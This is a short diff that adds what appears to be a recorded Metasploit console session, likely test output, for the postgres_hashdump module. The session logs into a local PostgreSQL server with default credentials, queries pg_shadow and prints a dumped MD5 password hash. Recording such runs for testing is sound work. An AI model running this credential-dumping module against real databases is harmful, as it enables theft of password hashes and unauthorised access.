@@ -1,0 +1,22 @@
+use auxiliary/scanner/postgres/postgres_hashdump
+Stopping all jobs...
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_version[0m) [0m> run lhost=127.0.0.1 username=postgres password=password rhost=127.0.0.1 rport=5432 Verbose=true
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> [+] 127.0.0.1:5432 Postgres - Logged in to 'postgres' with 'postgres':'password'
+[*] 127.0.0.1:5432 Postgres - querying with 'SELECT usename, passwd FROM pg_shadow'
+[!] No active DB -- Credential data will not be saved!
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+
+ Username  Hash
+ --------  ----
+ postgres  md532e12f215ba27cb750c9e093ce4b5127
+
+[*] 127.0.0.1:5432 Postgres - Disconnected
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> jobs -K
+[*] Killing all sessions...
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> 
